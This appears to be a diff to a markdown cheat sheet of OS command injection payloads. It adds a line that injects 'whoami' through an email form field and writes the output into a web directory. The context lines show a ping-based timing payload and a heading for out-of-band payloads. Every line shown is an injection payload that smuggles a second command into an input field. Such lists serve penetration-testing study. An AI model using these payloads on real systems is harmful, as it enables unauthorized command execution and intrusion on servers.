@@ -118,7 +118,9 @@ email=x||ping+-c+10+127.0.0.1||
 ```bash
 ; whoami > /var/www/images/test;
 ```
-
+```bash
+email=||whoami>/var/www/images/output.txt||
+```
 <br>
 
 ### Out-of-band channel payloads
